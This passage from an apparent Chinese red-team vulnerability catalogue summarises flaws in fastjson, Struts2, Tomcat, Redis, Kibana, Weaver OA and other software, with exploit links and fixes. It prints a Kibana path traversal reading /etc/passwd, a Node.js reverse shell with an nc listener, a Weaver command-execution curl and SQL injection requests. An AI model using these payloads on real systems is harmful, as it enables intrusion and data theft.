\u65f6 \u5019 \u4f1a \u586b \u5145 \\u001a , \u5728 1.2.60 \u8fdb \u884c \u4e86 \u4fee \u590d , \u5bf9 \\x \u540e \u9762 \u7684 \u5b57 \u7b26 \u8fdb \u884c \u662f \u5426 \u4e3a 16 \u8fdb \u5236 \u5141 \u8bb8 \u5b57 \u7b26 (0-9a-fA-F) \u7684\u6821\u9a8c,\u6240\u4ee5\u8fd9\u91cc\u5c31\u53ef\u4ee5\u624b\u52a8 padding ,\u6784\u9020\u4e00\u4e2a\u7279\u6b8a\u7684\u5b57\u7b26\u4e32\u3002 \u6f0f\u6d1e\u590d\u73b0 fastjson <= 1.2.24 \u53cd\u5e8f\u5217\u5316\u6f0f\u6d1e\u5206\u6790 https://www.secpulse.com/archives/73508.html fastjson 1.2.24\u53cd\u5e8f\u5217\u5316\u5bfc\u81f4\u4efb\u610f\u547d\u4ee4\u6267\u884c\u6f0f\u6d1e\u5206\u6790\u8bb0\u5f55 https://www.cnblogs.com/tr1ple/p/11431543.html fastjson 1.2.24\u53cd\u5e8f\u5217\u5316\u6f0f\u6d1e\u6df1\u5ea6\u5206\u6790 https://www.anquanke.com/post/id/211035 \u5982\u4f55\u5229\u7528 https://mntn0x.github.io/2020/04/07/Fastjson%E6%BC%8F%E6%B 4%9E%E5%A4%8D%E7%8E%B0/ \u9632\u62a4\u65b9\u6cd5 \u76f4\u63a5\u4e0b\u8f7d\u4e0d\u53d7\u5f71\u54cd\u7684\u65b0\u7248\u672c\u963f\u91cc\u5b98\u65b9\u5df2\u7ecf\u53d1\u5e03\u516c\u544a\uff0c\u5efa\u8bae\u53d7\u5f71\u54cd\u7684\u7528\u6237 \u7acb \u523b \u5347 \u7ea7 \u5230 1.2.28/1.2.29 \u6216\u66f4\u9ad8\u7684\u7248\u672c\uff0c\u4e0b\u8f7d\u5730\u5740\uff1a http://repo1.maven.org/maven2/com/alib aba/fastjson/1.2.29/","title":"Fastjson 1.2.22 - 1.2.24 \u53cd\u5e8f\u5217\u5316\u6f0f\u6d1e"},{"location":"redteam/%E6%BC%8F%E6%B4%9E%E5%BA%93/#struts","text":"\u6f0f\u6d1e\u7b80\u4ecb Apache Struts2 \u4f5c \u4e3a \u4e16 \u754c \u4e0a \u6700 \u6d41 \u884c \u7684 Java Web \u670d\u52a1\u5668\u6846\u67b6\u4e4b\u4e00\uff0c\u4ece\u51fa\u73b0\u6f0f\u6d1e\u81f3\u4eca\u867d\u7136\u6709\u4e9b\u5e74\u5934\uff0c\u4f46\u662f\u4ecd\u7136\u6ca1\u6709\u6d88\u5931\u3002 \u5f71\u54cd\u7ec4\u4ef6 Struts \u6f0f\u6d1e\u590d\u73b0 Struts2 \u5386\u53f2 RCE \u6f0f\u6d1e\u56de\u987e\u4e0d\u5b8c\u5168\u7cfb\u5217 https://rickgray.me/2016/05/06/review-struts2-remote-command \ufffeexecution-vulnerabilities/ \u6d45\u8c08struts2\u5386\u53f2\u4e0a\u7684\u9ad8\u5371\u7a81\u7834 https://www.anquanke.com/post/id/86757 strut2\u5404\u7248\u672c\u6f0f\u6d1e\u4fe1\u606f\u6574\u7406 https://www.zybuluo.com/Dukebf/note/821989 \u5229\u7528\u5de5\u5177 HatBoy/Struts2-Scan https://github.com/HatBoy/Struts2-Scan Struts2\u5947\u8469\u73af\u5883\u4efb\u610f\u6587\u4ef6\u4e0a\u4f20\u5de5\u5177 https://www.cnblogs.com/k8gege/p/10261217.html \u9632\u62a4\u65b9\u6cd5 \u5347\u7ea7\u5230\u6700\u65b0\u7248\u4e0d\u5efa\u8bae\u4f7f\u7528Struts","title":"Struts\u7cfb\u5217\u6f0f\u6d1e"},{"location":"redteam/%E6%BC%8F%E6%B4%9E%E5%BA%93/#solr","text":"\u7ec4\u4ef6\u63cf\u8ff0 Apache Solr\u662f\u4e00\u4e2a\u9ad8\u5ea6\u53ef\u9760\u3001\u53ef\u4f38\u7f29\u548c\u5bb9\u9519\u7684\uff0c\u63d0\u4f9b\u5206\u5e03\u5f0f\u7d22\u5f15\u3001\u590d\u5236\u548c\u8d1f\u8f7d \u5e73\u8861\u67e5\u8be2\u3001\u81ea\u52a8\u6545\u969c\u8f6c\u79fb\u548c\u6062\u590d\u3001\u96c6\u4e2d\u914d\u7f6e\u7b49\u529f\u80fd\u7684\u5f00\u6e90\u7684\u641c\u7d22\u670d\u52a1\u5668 \u3002Solr\u4e3a\u4e16\u754c\u4e0a\u8bb8\u591a\u6700\u5927\u7684\u4e92\u8054\u7f51\u7ad9\u70b9\u63d0\u4f9b\u641c\u7d22\u548c\u5bfc\u822a\u529f\u80fd\u3002Solr \u4f7f\u7528 Java \u8bed\u8a00\u5f00\u53d1\uff0c\u4e3b\u8981\u57fa\u4e8e HTTP \u548c Apache Lucene \u5b9e\u73b0\u3002Apache Solr \u4e2d \u5b58 \u50a8 \u7684 \u8d44 \u6e90 \u662f \u4ee5 Document \u4e3a\u5bf9\u8c61\u8fdb\u884c\u5b58\u50a8\u7684\u3002\u6bcf\u4e2a\u6587\u6863\u7531\u4e00\u7cfb\u5217\u7684 Field \u6784\u6210\uff0c\u6bcf\u4e2a Field \u8868 \u793a \u8d44 \u6e90 \u7684 \u4e00 \u4e2a \u5c5e \u6027 \u3002 Solr \u4e2d \u7684 \u6bcf \u4e2a Document \u9700\u8981\u6709\u80fd\u552f\u4e00\u6807\u8bc6\u5176\u81ea\u8eab\u7684\u5c5e\u6027\uff0c\u9ed8\u8ba4\u60c5\u51b5\u4e0b\u8fd9\u4e2a\u5c5e\u6027\u7684\u540d\u5b57\u662f id\uff0c\u5728 Schema \u914d\u7f6e\u6587\u4ef6\u4e2d\u4f7f\u7528\uff1a id \u5f71\u54cd\u7ec4\u4ef6 solr \u6f0f\u6d1e\u590d\u73b0 Solr\u7cfb\u5217\u6f0f\u6d1e\u590d\u73b0 https://www.jianshu.com/p/43e7f13e2058 \u5229\u7528\u5de5\u5177 k8gege/SolrExp https://github.com/k8gege/SolrExp 1135/solr_exploit https://github.com/1135/solr_exploit \u9632\u62a4\u65b9\u6cd5 \u5347\u7ea7\u5230\u6700\u65b0\u7248\u4e0d\u8981\u5bf9\u5916\u5f00\u653e\u654f\u611f\u7aef\u53e3","title":"Solr\u7cfb\u5217"},{"location":"redteam/%E6%BC%8F%E6%B4%9E%E5%BA%93/#tomcat","text":"","title":"Tomcat\u7c7b"},{"location":"redteam/%E6%BC%8F%E6%B4%9E%E5%BA%93/#tomcat-cve-2020-1938","text":"\u6f0f\u6d1e\u7b80\u4ecb Tomcat \u662f \u5e38 \u89c1 \u7684 Web \u5bb9 \u5668 , \u7528 \u6237 \u91cf \u975e \u5e38 \u5de8 \u5927 , Tomcat 8009 ajp\u7aef\u53e3\u4e00\u76f4\u662f\u9ed8\u8ba4\u5f00\u653e\u7684 \u5f71\u54cd\u8303\u56f4 Apache Tomcat 6 Apache Tomcat 7 < 7.0.100 Apache Tomcat 8 < 8.5.51 Apache Tomcat 9 < 9.0.31 \u6f0f\u6d1e\u7279\u5f81 tomcat/8009/ajp \\x04\\x01\\xf4\\x00\\x15 \u6f0f\u6d1e\u590d\u73b0 CVE-2020-1938 \u5e7d \u7075 \u732b ( GhostCat ) Tomcat-Ajp \u534f\u8bae\u4efb\u610f\u6587\u4ef6\u8bfb\u53d6/JSP\u6587\u4ef6\u5305\u542b\u6f0f\u6d1e\u5206\u6790 https://www.guildhab.top/?p=2406 Apache Tomcat\u6587\u4ef6\u5305\u542b\u6f0f\u6d1e\u5206\u6790 https://yinwc.github.io/2020/03/01/CVE-2020-1938/ CVE-2020-1938:Tomcat AJP\u534f\u8bae\u6587\u4ef6\u5305\u542b\u6f0f\u6d1e\u5206\u6790 http://gv7.me/articles/2020/cve-2020-1938-tomcat-ajp-lfi/ \u68c0\u6d4b\u5de5\u5177 bkfish/CNVD-2020-10487-Tomcat-Ajp-lfi-Scanner https://github.com/bkfish/CNVD-2020-10487-Tomcat-Ajp-lfi \ufffeScanner \u957f\u4ead\u79d1\u6280\u68c0\u6d4b\u5de5\u5177 https://www.chaitin.cn/zh/ghostcat#download \u9632\u62a4\u65b9\u6cd5 \u66f4\u65b0\u4e3a\u6700\u65b0\u7248\u672c \u82e5 \u4e0d \u9700 \u8981 \u4f7f \u7528 Tomcat AJP \u534f \u8bae \uff0c \u53ef \u76f4 \u63a5 \u5173 \u95ed AJP Connector\uff0c\u6216\u5c06\u5176\u76d1\u542c\u5730\u5740\u6539\u4e3a\u4ec5\u76d1\u542c\u672c\u673alocalhost\u3002 CVE-2020-9484 tomcat","title":"Tomcat \u672c\u5730\u6587\u4ef6\u5305\u542b\u6f0f\u6d1e (CVE-2020-1938)"},{"location":"redteam/%E6%BC%8F%E6%B4%9E%E5%BA%93/#session","text":"\u6f0f\u6d1e\u7b80\u4ecb Apache Tomcat\u53d1\u5e03\u901a\u544a\u79f0\u4fee\u590d\u4e86\u4e00\u4e2a\u6e90\u4e8e\u6301\u4e45\u5316Session\u7684\u8fdc\u7a0b\u4ee3\u7801\u6267\u884c\u6f0f\u6d1e \uff08CVE-2020-9484\uff09\u3002 \u6f0f\u6d1e\u6761\u4ef6\u6bd4\u8f83\u82db\u523b\uff1a tomcat\u5fc5\u987b\u542f\u7528session\u6301\u4e45\u5316\u529f\u80fdFileStore tomcat/lib \u6216 \u8005 WEB-INF/lib \u76ee \u5f55 \u4e0b \u7684 \u4f9d \u8d56 \u5b58 \u5728 \u53ef \u7528 \u7684 gadget 3. \u5728\u670d\u52a1\u5668\u4e0a\u5b58\u5728\u5df2\u77e5\u8def\u5f84\u6587\u4ef6\u5185\u5bb9\u53ef\u63a7 \u5f71\u54cd\u8303\u56f4 Apache Tomcat 10.x < 10.0.0-M5 Apache Tomcat 9.x < 9.0.35 Apache Tomcat 8.x < 8.5.55 Apache Tomcat 7.x < 7.0.104 \u6f0f\u6d1e\u4f9d\u8d56\u6761\u4ef6 \u914d\u7f6esession\u6301\u4e45\u5316 conf/context.xml \u90e8\u7f72Gadgets jar\u5305 \u4e0b\u8f7dcommons-collections4-4.0.jar \u5e76\u653e\u5728tomcat lib/\u76ee\u5f55\u4e0b \u6f0f\u6d1e\u590d\u73b0 CVE-2020-9484 tomcat session\u53cd\u5e8f\u5217\u5316\u6f0f\u6d1e\u5206\u6790\u4e0e\u590d\u73b0 https://www.cnblogs.com/potatsoSec/p/12931427.html CVE-2020-9484 tomcat session\u53cd\u5e8f\u5217\u5316\u6f0f\u6d1e\u5206\u6790\u4e0e\u590d\u73b0 https://blog.csdn.net/Jietewang/article/details/106462903 \u6f0f\u6d1e\u5229\u7528 tomcat-cluster-session-sync-exp https://github.com/threedr3am/tomcat-cluster-session-sync-exp \u9632\u62a4\u65b9\u6cd5 Apache Tomcat\u5b98\u65b9\u5df2\u7ecf\u53d1\u5e03\u65b0\u7248\u672c\u4fee\u590d\u4e0a\u8ff0\u6f0f\u6d1e\uff0c\u5efa\u8bae\u53d7\u5f71\u54cd\u7528\u6237\u5c3d\u5feb\u5347\u7ea7 \u8fdb\u884c\u9632\u62a4\u3002\u4e0d\u65b9\u4fbf\u5347\u7ea7\u7684\u7528\u6237\uff0c\u8fd8\u53ef\u4ee5\u6682\u65f6\u7981\u7528FileStore\u529f\u80fd\uff0c\u6216\u8005 \u5355\u72ec\u914d\u7f6esessionAttributeValueClassNameFilte\u7684\u503c\u6765\u786e\u4fdd\u53ea\u6709\u7279\u5b9a \u5c5e\u6027\u7684\u5bf9\u8c61\u53ef\u4ee5\u88ab\u5e8f\u5217\u5316/\u53cd\u5e8f\u5217\u5316\u3002","title":"session\u53cd\u5e8f\u5217\u5316\u6f0f\u6d1e\u5206\u6790"},{"location":"redteam/%E6%BC%8F%E6%B4%9E%E5%BA%93/#redis","text":"\u6f0f\u6d1e\u7b80\u4ecb \u90e8\u5206 Redis \u7ed1\u5b9a\u5728 0.0.0.0:6379 \uff0c\u5e76\u4e14\u6ca1\u6709\u5f00\u542f\u8ba4\u8bc1\uff08\u8fd9\u662f Redis \u7684\u9ed8\u8ba4\u914d\u7f6e\uff09\uff0c\u5982\u679c\u6ca1\u6709\u8fdb\u884c\u91c7\u7528\u76f8\u5173\u7684\u7b56\u7565\uff0c\u6bd4\u5982\u6dfb\u52a0\u9632\u706b\u5899\u89c4\u5219\u907f \u514d \u5176 \u4ed6 \u975e \u4fe1 \u4efb \u6765 \u6e90 ip \u8bbf \u95ee \u7b49 \uff0c \u5c06 \u4f1a \u5bfc \u81f4 Redis \u670d\u52a1\u76f4\u63a5\u66b4\u9732\u5728\u516c\u7f51\u4e0a\uff0c\u5bfc\u81f4\u5176\u4ed6\u7528\u6237\u53ef\u4ee5\u76f4\u63a5\u5728\u975e\u6388\u6743\u60c5\u51b5\u4e0b\u76f4\u63a5\u8bbf \u95ee Redis \u670d\u52a1\u5e76\u8fdb\u884c\u76f8\u5173\u64cd\u4f5c\u3002\u5229\u7528 Redis \u81ea\u8eab\u7684\u63d0\u4f9b\u7684 config \u547d\u4ee4\uff0c\u53ef\u4ee5\u8fdb\u884c\u5199\u6587\u4ef6\u64cd\u4f5c\uff0c\u653b\u51fb\u8005\u53ef\u4ee5\u6210\u529f\u5c06\u81ea\u5df1\u7684\u516c\u94a5\u5199\u5165\u76ee\u6807\u670d \u52a1 \u5668 \u7684 /root/.ssh \u6587 \u4ef6 \u5939 \u7684 authotrized_keys \u6587\u4ef6\u4e2d\uff0c\u8fdb\u800c\u53ef\u4ee5\u76f4\u63a5\u4f7f\u7528\u5bf9\u5e94\u7684\u79c1\u94a5\u767b\u5f55\u76ee\u6807\u670d\u52a1\u5668\u3002 \u5f71\u54cd\u7ec4\u4ef6 Redis \u6f0f\u6d1e\u7279\u5f81 6379\u7aef\u53e3 \u6f0f\u6d1e\u590d\u73b0 Redis \u672a\u6388\u6743\u8bbf\u95ee\u6f0f\u6d1e\u5229\u7528\u603b\u7ed3 http://www.alloyteam.com/2017/07/12910/ Redis\u672a\u6388\u6743\u8bbf\u95ee\u6f0f\u6d1e\u603b\u7ed3 https://fragrant10.github.io/2019/02/13/Redis%E6%9C%AA%E6%8 E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E6%BC%8F%E6 %B4%9E%E6%80%BB%E7%BB%93.html \u590d\u73b0\u5751\u70b9\u5206\u6790 redis\u6f0f\u6d1e\u5229\u7528 https://www.jianshu.com/p/2f56a58a1450 redis 4.x/5.x\u672a\u6388\u6743\u8bbf\u95ee\u6f0f\u6d1e\uff08\u4ee5\u53ca\u4e00\u4e9b\u73af\u5883\u642d\u5efa\u7684\u5751\uff09(7\u670818\u66f4\u65b0\uff09 http://www.mucn.site/index.php/Termux/210.html \u9632\u62a4\u65b9\u6cd5 redis\u6570\u636e\u5e93\u6f0f\u6d1e\u9632\u62a4 https://www.cnblogs.com/rinack/p/11099854.html redis\u672a\u6388\u6743\u8bbf\u95ee\u6f0f\u6d1e\u7684\u5229\u7528\u548c\u9632\u62a4 https://carey.akhack.com/2020/05/07/Redis%E6%9C%AA%E6%8E %88%E6%9D%83%E8%AE%BF%E9%97%AE%E6%BC%8F%E6% B4%9E%E7%9A%84%E5%88%A9%E7%94%A8%E5%92%8C%E9 %98%B2%E6%8A%A4/","title":"Redis\u76f8\u5173"},{"location":"redteam/%E6%BC%8F%E6%B4%9E%E5%BA%93/#zabbix","text":"\u6f0f\u6d1e\u7b80\u4ecb Zabbix\u7ec4\u4ef6\u4e3b\u8981\u5b58\u5728\u6ce8\u5165/\u5f31\u53e3\u4ee4/\u547d\u4ee4\u6267\u884c\u7b49\u7c7b\u578b\u7684\u6f0f\u6d1e\u3002 \u5f71\u54cd\u7ec4\u4ef6 Zabbix \u6f0f\u6d1e\u590d\u73b0\uff1a \u4fe1\u606f\u6536\u96c6 - Zabbix - \u6f0f\u6d1e - \u6c47\u603b https://www.cnblogs.com/AtesetEnginner/p/12641747.html Zabbix\uff08\u5206\u5e03\u5f0f\u7cfb\u7edf\u76d1\u89c6\uff09\u6f0f\u6d1e\u5b66\u4e60 https://www.jianshu.com/p/85e3b0266158 \u8bb0\u4e00\u6b21zabbix\u5b89\u88c5\u53ca\u6f0f\u6d1e\u5229\u7528getshell\u5168\u8fc7\u7a0b https://xz.aliyun.com/t/6874 Zabbix \u6700\u65b0 SQL \u6ce8\u5165\u6f0f\u6d1e\u53ca EXP \u2013 Jamin Zhang https://jaminzhang.github.io/security/Zabbix-latest-SQL-Injection \ufffeVulnerability-and-EXP/ \u6700\u65b0Zabbix\u6f0f\u6d1e\u53ca\u5176\u5229\u7528\u59ff\u52bf\uff08\u9644EXP\uff09 https://zhuanlan.zhihu.com/p/22082375 \u9632\u62a4\u65b9\u6cd5 https://www.bbsmax.com/A/QV5ZqlDeJy/","title":"Zabbix\u76f8\u5173"},{"location":"redteam/%E6%BC%8F%E6%B4%9E%E5%BA%93/#jenkins","text":"\u6f0f\u6d1e\u7b80\u4ecb Jenkins \u662f \u5e38 \u89c1 \u7684 CI/CD \u670d \u52a1 \u5668 , \u6700\u5e38\u89c1\u7684\u5c31\u662f\u7206\u7834\u5f31\u53e3\u4ee4\u7136\u540e\u4f7f\u7528groovy\u6267\u884c\u547d\u4ee4 \u5f71\u54cd\u7ec4\u4ef6 Jenkins \u6f0f\u6d1e\u7279\u5f81 Jenkins \u6f0f\u6d1e\u590d\u73b0 Jenkins\u6f0f\u6d1e\u96c6\u5408\u590d\u73b0 https://misakikata.github.io/2020/03/Jenkins%E6%BC%8F%E6%B4 %9E%E9%9B%86%E5%90%88%E5%A4%8D%E7%8E%B0/ Jenkins\u4efb\u610f\u6587\u4ef6\u8bfb\u53d6\u6f0f\u6d1e\u5206\u6790 https://www.freebuf.com/news/178808.html \u6f0f\u6d1e\u5229\u7528 blackye/Jenkins: Jenkins\u6f0f\u6d1e\u63a2\u6d4b\u3001\u7528\u6237\u6293\u53d6\u7206\u7834 https://github.com/blackye/Jenkins gquere/pwn_jenkins: Notes about attacking Jenkins servers https://github.com/gquere/pwn_jenkins Jenkins\u810f\u725b\u6f0f\u6d1eFRP\u5185\u7f51\u63d0\u6743 https://www.freebuf.com/articles/web/215183.html \u5229\u7528\u6280\u5de7 \u53ef \u4ee5 \u5728 Jenkins \u5904 \u8fdb \u884c \u5185 \u7f51 \u4fe1 \u606f \u6536 \u96c6 , \u83b7\u53d6\u7684\u8d26\u53f7\u901a\u5e38\u4e5f\u662f\u5f00\u53d1/\u8fd0\u7ef4\u7ea7\u522b\u7684, \u6743\u9650\u76f8\u5bf9\u8f83\u5927\u3002 \u9632\u62a4\u65b9\u6cd5 \u8bbe\u7f6e\u5f3a\u53e3\u4ee4\u5c3d\u91cf\u4e0d\u8981\u5f00\u653e\u5230\u516c\u7f51\u9650\u5236\u6765\u6e90IP\u5347\u7ea7\u5230\u6700\u65b0\u7248","title":"Jenkins\u76f8\u5173"},{"location":"redteam/%E6%BC%8F%E6%B4%9E%E5%BA%93/#kibana","text":"","title":"Kibana\u76f8\u5173"},{"location":"redteam/%E6%BC%8F%E6%B4%9E%E5%BA%93/#kibanacve-2019-7609","text":"\u6f0f\u6d1e\u7b80\u4ecb Kibana \u662f\u4e3a Elasticsearch\u8bbe\u8ba1\u7684\u5f00\u6e90\u5206\u6790\u548c\u53ef\u89c6\u5316\u5e73\u53f0\u3002\u4f60\u53ef\u4ee5\u4f7f\u7528 Kibana \u6765 \u641c \u7d22 \uff0c \u67e5 \u770b \u5b58 \u50a8 \u5728 Elasticsearch \u7d22\u5f15\u4e2d\u7684\u6570\u636e\u5e76\u4e0e\u4e4b\u4ea4\u4e92\u3002\u4f60\u53ef\u4ee5\u5f88\u5bb9\u6613\u5b9e\u73b0\u9ad8\u7ea7\u7684\u6570\u636e\u5206\u6790\u548c\u53ef\u89c6\u5316 \uff0c\u4ee5\u56fe\u6807\u7684\u5f62\u5f0f\u5c55\u73b0\u51fa\u6765\u3002 \u653b\u51fb\u8005\u5229\u7528\u6f0f\u6d1e\u53ef\u4ee5\u901a\u8fc7Timelion\u7ec4\u4ef6\u4e2d\u7684JavaScript\u539f\u578b\u94fe\u6c61\u67d3\u653b\u51fb \uff0c\u5411Kibana\u53d1\u8d77\u76f8\u5173\u8bf7\u6c42\uff0c\u4ece\u800c\u63a5\u7ba1\u6240\u5728\u670d\u52a1\u5668\uff0c\u5728\u670d\u52a1\u5668\u4e0a\u6267\u884c\u4efb \u610f\u547d\u4ee4\u3002 \u5f71\u54cd\u7248\u672c Kibana < 6.6.1 Kibana < 5.6.15 \u68c0\u6d4b\u65b9\u6cd5 \u6587\u4e2d\u7ed9\u51fa\u4e86POC https://dylan903.github.io/2019/10/20/kibana-rce-lou-dong-fu-xian/ \u6f0f\u6d1e\u590d\u73b0 CVE-2019-7609 Kibana\u8fdc\u7a0b\u4ee3\u7801\u6267\u884c\u6f0f\u6d1e\u653b\u51fb\u65b9\u6cd5\u548c\u6f0f\u6d1e\u539f\u7406\u5206\u6790 https://cloud.tencent.com/developer/article/1535121 CVE-2019-7609 Kibana \u4ee3\u7801\u6267\u884c\u6f0f\u6d1e\u590d\u73b0 http://blog.leanote.com/post/snowming/2cd6256df61d \u6f0f\u6d1e\u5229\u7528 jas502n/kibana-RCE https://github.com/jas502n/kibana-RCE \u5751\u70b9 \u90e8 \u7f72 \u8fc7 \u7a0b \u4e2d \u5982 \u679c \u51fa \u73b0 Kibana server is not ready yet,\u90a3\u4e48\u4f60\u662f\u9700\u8981\u786e\u5b9a\u4e0b \u4f60\u7684kibana\u4e0eelasticsearch\u7248\u672c\u662f\u5426\u4e00\u81f4 es\u8981\u7528\u975eroot\u7528\u6237\u542f\u52a8\uff0c\u5426\u5219\u4f1a\u62a5can not run elasticsearch as root\u9519\u8bef\u3002 \u9632\u5fa1\u65b9\u6cd5 \u5347\u7ea7Kibana\u81f3\u65b0\u7248\u672c","title":"Kibana\u8fdc\u7a0b\u4ee3\u7801\u6267\u884c\u6f0f\u6d1e(CVE-2019-7609)"},{"location":"redteam/%E6%BC%8F%E6%B4%9E%E5%BA%93/#kibanacve-2018-17246","text":"\u6f0f\u6d1e\u7b80\u4ecb \u6b64\u6f0f\u6d1e\u51fa\u73b0\u5728Kibana\u63a7\u5236\u53f0\uff08Console\uff09\u63d2\u4ef6\u4e2d\uff0c\u63a7\u5236\u53f0\u63d2\u4ef6\u662fKIban a\u7684\u57fa\u672c\u63d2\u4ef6\uff0c\u4e5f\u5c31\u662fKibana\u5fc5\u88c5\u7684\u63d2\u4ef6\u3002\u5f53\u524delastic\u6700\u65b0\u7248\u672c\u4e3a6.5 \uff0c\u53ef\u4ee5\u8bf4\u5927\u90e8\u5206elk\u7684\u7ec4\u4ef6\u4f1a\u5b58\u5728\u6b64\u95ee\u9898\uff0c\u4f46\u662f\u6b64\u95ee\u9898\u5229\u7528\u96be\u70b9\u5728\u4e8e\u5982 \u4f55\u521b\u5efa\u4e00\u4e2a\u6076\u610f\u7684\u672c\u5730\u6587\u4ef6\u3002 \u5f71\u54cd\u7248\u672c ElasticSearch Kibana < 6.4.3 ElasticSearch Kibana < 5.6.13 \u5229\u7528\u65b9\u6cd5 \u8bfb\u6587\u4ef6\u64cd\u4f5c http://192.168.1.3:5601/api/console/api_server?sense_version=%4 0%40SENSE_VERSION&apis=../../../../../../../../../../../etc/passwd \u53cd\u5f39shell\u5728kibana\u7684\u673a\u5668\u521b\u5efa /tmp/shell.js (function(){ var net = require(\"net\"), cp = require(\"child_process\"), sh = cp.spawn(\"/bin/sh\", []); var client = new net.Socket(); client.connect(8080, \"192.168.1.2\", function(){ client.pipe(sh.stdin); sh.stdout.pipe(client); sh.stderr.pipe(client); }); return /a/; })(); \u8bf7\u6c42\u5305\u542b\u521a\u521a\u521b\u5efa\u7684shell\uff1a http://192.168.1.3:5601/api/console/api_server?sense_version=%4 0%40SENSE_VERSION&apis=../../../../../../../../../../../tmp/shell.js \u672c\u5730\u76d1\u542c\uff1a nc -l 8080 -v \u6f0f\u6d1e\u590d\u73b0 Elasticsearch \u6838\u5fc3\u63d2\u4ef6Kibana \u672c\u5730\u6587\u4ef6\u5305\u542b\u6f0f\u6d1e\u5206\u6790\uff08CVE-2018- 17246\uff09 https://www.anquanke.com/post/id/168291 ELK LFI CVE-2018-17246 https://wh0ale.github.io/2018/12/18/2018-12-18- ELK%20LFI%20CVE-2018-17246/ \u5751\u70b9 \u6700\u7ec8\u6f0f\u6d1e\u7684\u5f71\u54cd\u5173\u952e\u5728\u4e8e\u5982\u4f55\u521b\u5efashell\u6587\u4ef6\u3002 \u4fee\u590d\u5efa\u8bae \u76ee\u524d\u5382\u5546\u5df2\u53d1\u5e03\u5347\u7ea7\u8865\u4e01\u4ee5\u4fee\u590d\u6f0f\u6d1e\uff0c\u8865\u4e01\u83b7\u53d6\u94fe\u63a5: https://access.redhat.com/security/cve/cve-2018-17246","title":"Kibana\u6f0f\u6d1eCVE-2018-17246"},{"location":"redteam/%E6%BC%8F%E6%B4%9E%E5%BA%93/#oa","text":"","title":"\u6cdb\u5faeOA\u76f8\u5173"},{"location":"redteam/%E6%BC%8F%E6%B4%9E%E5%BA%93/#oa_1","text":"\u6f0f\u6d1e\u7b80\u4ecb \u6cdb\u5faeOA\u529e\u516c\u7cfb\u7edf\u662f\u4e00\u6b3e\u534f\u8c03\u529e\u516c\u8f6f\u4ef6\u3002 \u6cdb\u5fae\u534f\u540c\u5546\u52a1\u8f6f\u4ef6\u7cfb\u7edf\u5b58\u5728\u547d\u4ee4\u6267\u884c\u6f0f\u6d1e\uff0c\u653b\u51fb\u8005\u53ef\u5229\u7528\u8be5\u6f0f\u6d1e\u83b7\u53d6\u670d \u52a1\u5668\u6743\u9650\u3002 \u5f71\u54cd\u8303\u56f4 \u6cdb\u5fae e-cology<=9.0 \u6f0f\u6d1e\u590d\u73b0 https://www.cnblogs.com/Sylon/p/11765543.html Poc \u6f0f\u6d1e\u8def\u5f84:/weaver/bsh.servlet.BshServlet exec(\"whoami\")curl http://xx.xx.xx.xx.xx/weaver/bsh.servlet.BshServlet/ -d 'bsh.script=eval%00(\"ex\"%2b\"ec(\"whoami\")\");&bsh.servlet.capture OutErr=true&bsh.servlet.outp ut=raw' \u6279\u91cf\u68c0\u6d4b\u5de5\u5177 https://github.com/sunird/e-cology-poc \u9632\u62a4\u65b9\u6cd5 \u5c4f\u853d/weaver/*\u76ee\u5f55\u7684\u8bbf\u95ee\uff1b https://www.weaver.com.cn/cs/securityDownload.asp","title":"\u6cdb\u5faeOA\u7cfb\u7edf\u591a\u7248\u672c\u5b58\u5728\u547d\u4ee4\u6267\u884c\u6f0f\u6d1e"},{"location":"redteam/%E6%BC%8F%E6%B4%9E%E5%BA%93/#e-cology-oasql","text":"\u6f0f\u6d1e\u7b80\u4ecb \u6cdb \u5fae e-cology OA\u7cfb\u7edf\u7684WorkflowCenterTreeData\u63a5\u53e3\u5728\u4f7f\u7528Oracle\u6570\u636e\u5e93\u65f6,\u7531\u4e8e \u5185 \u7f6e SQL \u8bed \u53e5 \u62fc \u63a5 \u4e0d \u4e25 , \u5bfc \u81f4 \u6cdb \u5fae e-cology OA\u7cfb\u7edf\u5b58\u5728SQL\u6ce8\u5165\u6f0f\u6d1e\u3002\u653b\u51fb\u8005\u5229\u7528\u8be5\u6f0f\u6d1e\uff0c\u53ef\u5728\u672a\u6388\u6743\u7684\u60c5\u51b5\u4e0b \uff0c\u8fdc\u7a0b\u53d1\u9001\u7cbe\u5fc3\u6784\u9020\u7684SQL\u8bed\u53e5\uff0c\u4ece\u800c\u83b7\u53d6\u6570\u636e\u5e93\u654f\u611f\u4fe1\u606f\u3002 \u5f71\u54cd\u8303\u56f4 \u6cdb\u5faee-cology<=9.0 \u6f0f\u6d1e\u590d\u73b0 \u6cdb\u5fae\u751f\u6001OA\u7cfb\u7edfSQL\u6ce8\u5165\u6269\u5c55\u590d\u73b0 https://mumuka.gitee.io/passages/%E6%B3%9B%E5%BE%AEe \ufffecology%20OA%20SQL%E6%B3%A8%E5%85%A5%E6%BC%8F% E6%B4%9E%E5%A4%8D%E7%8E%B0/ \u6cdb\u5fae e-cology OA \u524d\u53f0SQL\u6ce8\u5165\u6f0f\u6d1e\u590d\u73b0 https://cloud.tencent.com/developer/article/1521764 \u7b80\u6613poc POST /mobile/browser/WorkflowCenterTreeData.jsp?node=wftype_1&sco pe=2333 HTTP/1.1 Host: ip:port User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.14; rv:56.0) Gecko/20100101 Firefox/56.0 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,/;q=0.8 Accept-Language: zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3 Accept-Encoding: gzip, deflateContent-Type: application/x-www\ufffeform-urlencoded Content-Length: 2236 Connection: close Upgrade-Insecure-Requests: 1 formids=11111111111)))%0a%0dunion select NULL,value from v$parameter order by (((1 \u5229\u7528\u5de5\u5177 AdministratorGithub/e-cology-OA-SQL https://github.com/AdministratorGithub/e-cology-OA-SQL mmioimm/ecology_test https://github.com/mmioimm/ecology_test \u9632\u62a4\u65b9\u6cd5 \u53ca\u65f6\u6253\u8865\u4e01 \u6cdb\u5fae\u5b98\u65b9\u5b89\u5168\u8865\u4e01\uff1a https://www.weaver.com.cn/cs/securityDownloa d.asp Thinkcmf\u76f8\u5173 \u524d\u53f0SQL\u6ce8\u5165: \u4f9d\u8d56\u6761\u4ef6 \u9700\u8981\u666e\u901a\u7528\u6237\u6743\u9650\uff0c\u9ed8\u8ba4\u53ef\u6ce8\u518c payload\uff1a POST /ThinkCMFX/index.php?g=portal&m=article&a=edit_post HTTP/1.1 Host: localhost Connection: close Cookie: PHPSESSID=kcg5v82ms3v13o8pgrhh9saj95 Content-Type: application/x-www-form-urlencoded Content-Length: 79 